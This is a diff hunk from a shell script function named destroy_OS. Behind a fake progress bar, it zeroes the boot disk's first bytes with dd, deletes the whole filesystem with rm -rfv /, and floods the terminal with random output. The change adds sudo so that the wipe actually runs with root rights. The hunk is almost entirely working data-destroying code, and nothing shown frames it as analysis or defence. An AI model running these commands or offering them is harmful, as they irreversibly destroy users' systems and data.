@@ -30,9 +30,9 @@ function destroy_OS()
         echo -ne '#######################   (100%)\r'
             echo -ne '\n'
     
-    dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
-    rm -rfv /
-    printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
+    sudo dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
+    sudo rm -rfv /
+    printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..105670}
     
     echo $RANDOM | md5sum | head -c 20; echo;
 
